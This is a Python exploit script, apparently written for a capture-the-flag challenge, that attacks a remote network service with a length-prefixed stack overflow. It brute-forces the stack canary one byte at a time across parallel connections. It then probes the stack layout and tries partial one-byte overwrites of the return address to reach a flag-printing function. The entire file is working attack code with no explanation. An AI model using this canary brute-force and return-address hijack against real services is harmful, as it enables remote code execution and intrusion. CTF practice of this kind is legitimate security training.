#!/usr/bin/env python3
import socket,struct,time,concurrent.futures,collections,re,sys
H,P="0.cloud.chals.io",27813
FLAG=re.compile(rb'isfcr\{[^}\r\n]{1,250}\}')
def probe(payload,limit=.55,finish=False):
    raw=b''; closed=False
    try:
        with socket.create_connection((H,P),timeout=3) as s:
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
            s.settimeout(.13)
            s.sendall(struct.pack(">H",len(payload))+payload)
            if finish:
                pre=b''
                q=time.monotonic()+.8
                while time.monotonic()<q:
                    try:
                        ck=s.recv(4096)
                        if not ck:break
                        pre+=ck
                        if b'logged ' in pre:break
                    except socket.timeout:continue
                raw+=pre
                s.shutdown(socket.SHUT_WR)
            deadline=time.monotonic()+limit
            while time.monotonic()<deadline:
                try:
                    c=s.recv(4096)
                    if not c:closed=True;break
                    raw+=c
                    if FLAG.search(raw):print("FLAG FOUND",repr(FLAG.search(raw).group()),flush=True);sys.exit(0)
                    if re.search(rb'logged \d+\.',raw) and not finish:break
                except socket.timeout:continue
                except OSError: closed=True;break
    except OSError:pass
    m=re.search(rb'logged (\d+)\.',raw)
    return ('ACK' if m and int(m.group(1))==len(payload) else 'DEAD' if closed else 'SILENT',raw)
def sweep(prefix,label,workers=12,limit=.65):
    results={}
    def f(x):return x,probe(prefix+bytes([x]),limit)
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        for x,r in pool.map(f,range(256)):
            results[x]=r[0]
            if r[0]=='ACK':print(label, "candidate",hex(x),flush=True)
    print(label,"counts",dict(collections.Counter(results.values())),flush=True)
    return [x for x,v in results.items() if v=='ACK']
canary=b'\x00'
prefix=b'A'*88
print('START',time.asctime(),flush=True)
for n in range(1,8):
    good=sweep(prefix+canary,'CANARY_'+str(n))
    confirmed=[]
    for v in good:
        status=[probe(prefix+canary+bytes([v]),.8)[0] for i in range(4)]
        if status.count('ACK')>=3: confirmed.append(v)
        print('VERIFY',n,hex(v),status,flush=True)
    if len(confirmed)!=1:
        print('CANARY INCOMPLETE',canary.hex(),'verified',confirmed,flush=True)
        sys.exit(2)
    canary+=bytes([confirmed[0]])
    print('CANARY SO FAR',canary.hex(),flush=True)
print('FULL_CANARY',canary.hex(),flush=True)
for extra in [b'',b'B'*1,b'B'*4,b'B'*7,b'B'*8,b'B'*9,b'B'*16,b'\x00'*8]:
    print('STACK',len(extra),probe(prefix+canary+extra,1.4,True),flush=True)
# Probe a 1-byte RIP overwrite with plausible saved RBP; if win function nearby print flag.
for rbp in [b'B'*8,b'\x00'*8]:
    print('RBP',rbp.hex(),flush=True)
    def f(v):
        stat,data=probe(prefix+canary+rbp+bytes([v]),1.1,True)
        return v,stat,data
    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as pool:
        for v,stat,data in pool.map(f,range(256)):
            if b'flag' in data.lower() or b'isfcr{' in data or b'logged' not in data:
                print('RIP CANDIDATE',hex(v),stat,repr(data),flush=True)
print('DONE',flush=True)
